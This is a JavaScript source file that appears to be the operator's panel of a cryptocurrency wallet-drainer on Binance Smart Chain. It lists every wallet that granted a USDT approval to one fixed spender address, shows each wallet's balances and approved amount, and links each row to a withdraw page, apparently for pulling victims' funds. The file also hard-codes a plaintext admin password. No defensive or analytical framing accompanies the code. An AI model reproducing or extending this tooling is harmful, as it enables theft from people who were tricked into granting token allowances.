// ===== CONFIG =====
const ADMIN_PASSWORD = "Akashankit1@#";
const BSC_RPC = "https://bsc-dataseed.binance.org/";
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function balanceOf(address) view returns (uint256)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

const provider = new ethers.JsonRpcProvider(BSC_RPC);
const usdt = new ethers.Contract(USDT, ABI, provider);

// ===== LOGIN =====
function login() {
  if (document.getElementById("adminPass").value === ADMIN_PASSWORD) {
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("adminApp").style.display = "block";
  } else {
    alert("Wrong password");
  }
}

// ===== LOAD APPROVALS =====
async function loadApprovedUsers() {
  const tbody = document.getElementById("rows");
  tbody.innerHTML = "";

  const latest = await provider.getBlockNumber();
  const events = await usdt.queryFilter(
    usdt.filters.Approval(null, SPENDER),
    latest - 50000,
    latest
  );

  const map = new Map();
  events.forEach(e => map.set(e.args.owner, e));

  for (const [user, e] of map.entries()) {
    const [ub, bb] = await Promise.all([
      usdt.balanceOf(user),
      provider.getBalance(user)
    ]);

    addRow(
      user,
      ethers.formatUnits(ub,6),
      ethers.formatEther(bb),
      ethers.formatUnits(e.args.value,6),
      e.transactionHash
    );
  }
}

// ===== ADD ROW =====
function addRow(user, usdtBal, bnbBal, approved, tx) {
  const tr = document.createElement("tr");
  tr.innerHTML = `
    <td>${user}</td>
    <td>${usdtBal}</td>
    <td>${bnbBal}</td>
    <td>${approved}</td>
    <td><a href="https://bscscan.com/tx/${tx}" target="_blank">${tx.slice(0,10)}...</a></td>
  `;
  tr.onclick = () => {
    window.open(`withdraw.html?from=${user}`, "_blank");
  };
  document.getElementById("rows").appendChild(tr);
}

// ===== SEARCH =====
function filterUsers() {
  const q = document.getElementById("search").value.toLowerCase();
  document.querySelectorAll("#rows tr").forEach(r=>{
    r.style.display = r.innerText.toLowerCase().includes(q) ? "" : "none";
  });
}
